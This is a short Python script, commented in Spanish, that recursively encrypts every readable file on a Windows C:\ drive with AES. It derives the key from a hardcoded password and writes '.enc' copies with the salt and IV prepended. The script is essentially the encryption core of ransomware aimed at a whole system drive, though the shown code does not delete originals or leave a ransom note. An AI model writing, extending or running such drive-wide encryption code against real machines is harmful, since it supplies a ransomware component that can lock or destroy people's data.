import os
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

def encrypt_file(file_path, password):
    try:
        # Evitar archivos protegidos o sin permisos
        with open(file_path, 'rb') as file:
            pass
    except PermissionError:
        print(f"No se tiene permiso para leer el archivo: {file_path}")
        return

    salt = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        iterations=100000,
        salt=salt,
        length=32,
        backend=default_backend()
    )
    key = kdf.derive(password.encode())

    with open(file_path, 'rb') as file:
        plaintext = file.read()

    # Agregamos un vector de inicialización (IV)
    iv = os.urandom(16)

    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Aplicamos el padding a los datos
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    plaintext_padded = padder.update(plaintext) + padder.finalize()

    ciphertext = encryptor.update(plaintext_padded) + encryptor.finalize()

    with open(file_path + ".enc", 'wb') as encrypted_file:
        encrypted_file.write(salt + iv + ciphertext)

def encrypt_recursive(directory, password):
    for root, dirs, files in os.walk(directory):
        for folder in dirs[:]:  # Iterar sobre una copia de dirs para poder modificar dirs durante el bucle
            folder_path = os.path.join(root, folder)
            try:
                # Intentar acceder a la carpeta
                os.listdir(folder_path)
            except PermissionError:
                print(f"No se tiene permiso para acceder a la carpeta: {folder_path}")
                dirs.remove(folder)  # Excluir la carpeta de la lista para evitar procesarla

        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, password)

# Uso
directory_to_encrypt = "C:\\"
password = "tu_contrasena_secreta"

encrypt_recursive(directory_to_encrypt, password)
